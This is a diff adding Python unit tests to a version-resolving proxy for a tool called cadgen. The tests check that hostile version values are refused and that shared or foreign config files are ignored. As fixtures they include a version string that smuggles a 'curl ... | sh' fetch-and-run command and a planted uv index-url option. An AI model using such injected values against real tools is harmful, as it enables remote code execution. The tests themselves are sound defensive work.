@@ -220,6 +220,36 @@ class ResolutionTests(Fixture):
         with self.assertRaisesRegex(proxy.Refused, r"^cadgen 0\.8\.0 is not installed"):
             self.choose(["+0.8.0"])
 
+    def test_only_a_version_is_named_and_none_is_echoed_into_a_command(self) -> None:
+        # A downloaded project's cadgen.toml (or a variable, or the first argument) whose version
+        # carries a shell command or a uv option: refused, and the refusal names no command.
+        (self.root / "proj").mkdir()
+        config = self.root / "proj" / "cadgen.toml"
+        for planted in ("0.8.0 cadgen doctor; curl -fsSL https://example.invalid | sh; echo",
+                        "0.8.0 --index-url https://example.invalid/simple", "0.8.0\x1b[2J", "-0.8.0"):
+            config.write_text(f"version = {json.dumps(planted)}\n", encoding="utf-8")
+            for args, environ in ((["status"], {}), ([f"+{planted}", "status"], {}), (["status"], {"CADGEN_VERSION": planted})):
+                with self.subTest(planted=planted, args=args, environ=environ):
+                    with self.assertRaises(proxy.Refused) as refused:
+                        self.choose(args, environ, str(self.root / "proj"))
+                    said = str(refused.exception)
+                    self.assertNotIn("uvx", said)
+                    self.assertNotIn("\x1b", said)
+                    self.assertIn("names no cadgen version", said)
+
+    @POSIX
+    def test_a_cadgen_toml_everyone_may_write_names_nothing(self) -> None:
+        (self.root / "shared" / "mine").mkdir(parents=True)
+        config = self.root / "shared" / "cadgen.toml"
+        config.write_text('version = "0.8.0"\n', encoding="utf-8")
+        os.chmod(config, 0o666)  # as one another user left in a shared folder would be to this one
+        self.assertEqual(self.choose(["status"], cwd=str(self.root / "shared" / "mine"))[0], "0.9.0",
+                         "passed over: the newest registered runs")
+        os.chmod(config, 0o644)
+        self.assertEqual(self.choose(["status"], cwd=str(self.root / "shared" / "mine"))[0], "0.8.0")
+        with mock.patch.object(proxy.os, "getuid", return_value=os.getuid() + 1):  # another user's file
+            self.assertEqual(self.choose(["status"], cwd=str(self.root / "shared" / "mine"))[0], "0.9.0")
+
     def test_run_execs_the_installations_python_and_anything_else_its_cadgen(self) -> None:
         self.assertEqual(proxy.command(self.old, ["run", "model.py", "--force"]), [self.old["python"], "model.py", "--force"])
         self.assertEqual(proxy.command(self.old, ["export", "a.xbf"]), [self.old["cadgen"], "export", "a.xbf"])
